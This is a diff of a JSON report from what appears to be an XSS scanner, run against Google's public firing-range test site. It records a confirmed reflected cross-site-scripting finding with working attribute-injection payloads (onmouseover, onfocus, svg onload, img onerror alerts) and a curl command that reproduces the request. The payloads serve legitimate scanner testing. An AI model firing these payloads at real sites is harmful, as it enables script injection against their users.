@@ -1,7 +1,7 @@
 {
   "tool": "SV1",
   "author": "ee.zvz",
-  "version": "1.3.0",
+  "version": "1.3.1",
   "meta": {
     "target": "https://public-firing-range.appspot.com/reflected/parameter/attribute_name?q=test",
     "crawl": false,
@@ -28,7 +28,7 @@
     "blind": false,
     "ssrf": false,
     "oob": "",
-    "fail_on": "any",
+    "fail_on": "none",
     "scope": "",
     "db": "",
     "sarif": "",
@@ -43,7 +43,7 @@
     "unverified": 0,
     "fixed": 0,
     "retest": false,
-    "duration_seconds": 17.92
+    "duration_seconds": 12.13
   },
   "counts": {
     "total": 1,
@@ -61,20 +61,20 @@
       "url": "https://public-firing-range.appspot.com/reflected/parameter/attribute_name",
       "method": "GET",
       "param": "q",
-      "payload": "sv1c2654b31 onmouseover=\"alert('sv1c2654b31')\" x=",
+      "payload": "sv1a103fc50 onmouseover=\"alert('sv1a103fc50')\" x=",
       "confidence": "CONFIRMED",
-      "evidence": "executed in chromium: alert:sv1c2654b31",
+      "evidence": "executed in chromium: alert:sv1a103fc50",
       "technique": "reflected/attr",
       "detail": "reflection confirmed; execution not yet proven (inside <tag> attribute ? (bare quoted)) | proof: alert fired",
-      "artifact": "fr-artifacts-har-1.3.0/xss-01.png",
-      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/parameter/attribute_name?q=sv1c2654b31+onmouseover%3D%22alert%28%27sv1c2654b31%27%29%22+x%3D'",
+      "artifact": "firing-range-har-artifacts-1.3.1/xss-01.png",
+      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/parameter/attribute_name?q=sv1a103fc50+onmouseover%3D%22alert%28%27sv1a103fc50%27%29%22+x%3D'",
       "data": {},
       "alternatives": [
-        "sv1c2654b31 autofocus onfocus=\"alert('sv1c2654b31')\" x=",
-        "sv1c2654b31><svg/onload=alert('sv1c2654b31')>",
-        "sv1c2654b31><img src=x onerror=alert('sv1c2654b31')>",
-        "sv1c2654b31\"><svg/onload=alert('sv1c2654b31')>",
-        "sv1c2654b31'><svg/onload=alert('sv1c2654b31')>"
+        "sv1a103fc50 autofocus onfocus=\"alert('sv1a103fc50')\" x=",
+        "sv1a103fc50><svg/onload=alert('sv1a103fc50')>",
+        "sv1a103fc50><img src=x onerror=alert('sv1a103fc50')>",
+        "sv1a103fc50\"><svg/onload=alert('sv1a103fc50')>",
+        "sv1a103fc50'><svg/onload=alert('sv1a103fc50')>"
       ]
     }
   ]
